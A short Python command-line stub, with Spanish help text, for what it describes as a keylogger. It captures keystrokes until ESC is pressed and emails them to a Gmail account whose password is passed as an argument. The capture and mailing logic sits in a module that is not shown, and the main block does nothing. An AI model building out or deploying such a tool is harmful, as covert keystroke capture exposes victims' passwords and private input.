import argparse
from MainModule.InputModule import KeyIntercept

parser = argparse.ArgumentParser(description="Script sencillo que captura la entrada de teclado"
                                             " del usuario, el programa se detiene cuando pulsas"
                                             " la tecla ESC,cuando el programa termina envía la "
                                             "información capturada a el correo indicado."
                                             "Debe ser de Gmail")

parser.add_argument("-e", "--email", required=True, help="Correo al que enviar la información")
parser.add_argument("-p", "--passwd", required=True, help="Contraseña del correo especificado")
parser.add_argument("-s", "--subject", default="Key Response", help="Asunto del correo")
parser.add_argument("-f", "--file-temp", default="output.txt", help="Archivo temporal")
argParser = parser.parse_args()

if __name__ == "__main__":
    try:
        pass
    except KeyboardInterrupt:
        print("Programa finalizado por el usuario")
    except Exception as e:
        print("Excepción no controlada", e)
